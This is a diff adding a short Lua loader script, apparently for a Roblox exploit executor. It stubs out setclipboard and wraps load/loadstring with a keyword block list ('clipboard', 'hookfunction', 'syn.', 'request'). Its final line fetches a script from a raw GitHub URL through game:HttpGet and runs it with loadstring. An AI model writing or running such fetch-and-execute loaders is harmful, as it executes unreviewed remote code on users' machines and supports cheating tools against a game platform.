@@ -1,0 +1,14 @@
+if type(setclipboard) == "function" then setclipboard = function() end end
+local orig_load = load or loadstring
+local bad = { "setclipboard", "clipboard", "hookfunction", "syn.", "request" }
+local function safe_load(s, ...)
+    if type(s) == "string" then
+        local sl = s:lower()
+        for i=1,#bad do if sl:find(bad[i],1,true) then return nil, "blocked" end end
+    end
+    return orig_load(s, ...)
+end
+if load then load = safe_load end
+if loadstring then loadstring = safe_load end
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ghyujyhtgrbfds-alt/redraw/refs/heads/main/tiro"))()
